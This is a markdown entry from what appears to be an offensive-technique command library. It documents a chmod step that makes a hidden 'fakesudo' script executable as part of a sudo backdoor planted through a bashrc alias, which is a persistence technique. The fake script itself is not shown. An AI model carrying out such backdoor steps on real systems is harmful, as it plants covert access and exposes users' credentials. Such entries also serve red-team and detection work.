---
type: command
executor: bash
data: chmod u+x ~/.hidden/fakesudo
platforms:
  - Linux
  - Unix
tags:
  - persistence
  - backdoor
verified: true
validated: true
---

# make-fakesudo-executable

## Command

```bash
chmod u+x ~/.hidden/fakesudo
```

## Description

This command sets the user execute permission on the fakesudo script, allowing it to run when invoked via the sudo alias. Use this after creating the script file to enable the backdoor functionality.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| u+x | User execute permission flag | Yes |
| ~/.hidden/fakesudo | Path to the fake sudo script | Yes |

## Examples

### Basic Usage

```bash
chmod u+x ~/.hidden/fakesudo
```

### Verify Permissions

```bash
ls -l ~/.hidden/fakesudo
```

## Expected Output

No output on success. Verification shows executable permissions, e.g.:

-rwxr--r-- 1 user user 123 Apr 10 20:00 /home/user/.hidden/fakesudo

## Related

- [[procedures/Implement-Sudo-Backdoor-via-Bashrc-Alias]]
- [[commands/create-sudo-alias-in-bashrc]]
